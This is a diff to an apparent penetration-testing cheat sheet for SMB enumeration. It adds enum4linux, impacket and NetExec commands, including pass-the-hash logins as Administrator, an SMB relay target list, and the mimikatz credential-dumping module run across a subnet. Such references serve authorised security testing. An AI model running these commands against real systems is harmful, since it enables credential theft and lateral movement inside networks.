@@ -48,10 +48,24 @@ All simple checks:
 
 ```
 enum4linux -a x.x.x.x
+enum4linux -U x.x.x.x
+enum4linux -r x.x.x.x
+enum4linux -S x.x.x.x
 ```
 
 Brute force guessing for share names:
 `enum4linux -s /usr/share/enum4linux/share-list.txt x.x.x.x`
+
+## Enum4linux-Ng
+
+https://github.com/cddmp/enum4linux-ng
+
+```
+enum4linux 172.21.0.0 -A
+enum4linux-ng 172.21.0.0 -A -C
+enum4linux 172.21.0.0 -S
+enum4linux 172.21.0.0 -K ticket.kirbi -A
+```
 
 ## Nmap: 
 
@@ -134,6 +148,13 @@ python3 samdump.py SMB x.x.x.x
 
 ```
 /usr/share/doc/python3-impacket/examples/smbclient.py username@172.21.0.0
+impacket-smbclient username@172.21.0.0
+```
+
+## Impacket Samdump:
+
+```
+impacket-sam SMB 172.21.0.0
 ```
 
 ## RPCclient
@@ -161,6 +182,19 @@ Attempt an null connection:
 
 ```
 $ crackmapexec smb x.x.x.x --pass-pol -u '' -p ''
+```
+
+## NetExec: 
+
+Replaced all crackmapexec commands with NetExec due to change in contribution of the project
+
+```
+netexec smb -L 
+netexec 172.21.0.0 -u Administrator -H [hash] --local-auth
+netexec 172.21.0.0 -u Administrator -H [hash] --share
+netexec smb --gen-relay-list smb-targets.txt 172.21.0.0/24
+netexec smb 172.21.0.0/24 -u user -p 'Password' --local-auth -M mimikatz
+netexec smb x.x.x.x --pass-pol -u '' -p ''
 ```
 
 ## Polenum
